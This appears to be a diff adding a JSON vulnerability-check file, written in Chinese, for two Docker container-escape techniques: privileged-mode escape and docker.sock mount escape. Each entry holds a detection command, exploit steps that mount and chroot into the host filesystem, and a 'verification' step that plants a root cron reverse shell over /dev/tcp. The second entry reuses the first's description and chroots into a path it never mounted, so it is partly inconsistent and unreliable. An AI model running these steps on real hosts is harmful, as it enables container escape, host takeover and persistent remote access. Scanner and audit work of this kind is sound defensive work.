@@ -1,0 +1,58 @@
+{
+  "vuls": [
+    {
+      "name": "Docker 高危启动参数 - 特权模式启动容器",
+      "type": "Docker escape",
+      "cve": "无",
+      "description": "特权模式逃逸是一种最简单有效的逃逸方法。使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对宿主机的文件读写权限，进而可能通过chroot切换根目录，写入ssh公钥或计划任务等手段进行getshell。",
+      "versions_affected": [
+        "无"
+      ],
+      "severity": "Critical",
+      "cvss_score": 0,
+      "test_command": "cat /proc/self/status | grep Cap",
+      "expected_output": "\\s+CapEff:\\s+00000[0-9a-f]ffffffffff\\s+",
+      "steps_to_exploit": [
+        "mkdir /test",
+        "mount /dev/sda /test",
+        "chroot /test /bin/sh -c 'cat /etc/passwd'"
+      ],
+      "steps_to_verify": [
+        "echo '* * * * * /bin/bash -i >& /dev/tcp/_/_ 0>&1' >> /test/var/spool/cron/crontabs/root"
+      ],
+      "mitigation": "禁止特权模式启动Docker",
+      "references": [
+        "https://example.com/cve-2024-xxxx",
+        "https://exploit-db.com/exploits/xxxx"
+      ]
+    },
+    {
+      "name": "挂载 Docker Socket 逃逸",
+      "type": "Docker escape",
+      "cve": "无",
+      "description": "特权模式逃逸是一种最简单有效的逃逸方法。使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对宿主机的文件读写权限，进而可能通过chroot切换根目录，写入ssh公钥或计划任务等手段进行getshell。",
+      "versions_affected": [
+        "无"
+      ],
+      "severity": "Critical",
+      "cvss_score": 0,
+      "test_command": "ls -lah /var/run/docker.sock",
+      "expected_output": ".*/var/run/docker.sock.*",
+      "steps_to_exploit": [
+        "apt-get update",
+        "apt-get install curl",
+        "curl -fsSL https://get.docker.com/ | sh",
+        "docker run -it -v /:/ning ubuntu /bin/bash",
+        "chroot /test /bin/sh -c 'cat /etc/passwd'"
+      ],
+      "steps_to_verify": [
+        "echo '* * * * * /bin/bash -i >& /dev/tcp/_/_ 0>&1' >> /test/var/spool/cron/crontabs/root"
+      ],
+      "mitigation": "禁止特权模式启动Docker",
+      "references": [
+        "https://example.com/cve-2024-xxxx",
+        "https://exploit-db.com/exploits/xxxx"
+      ]
+    }
+  ]
+}
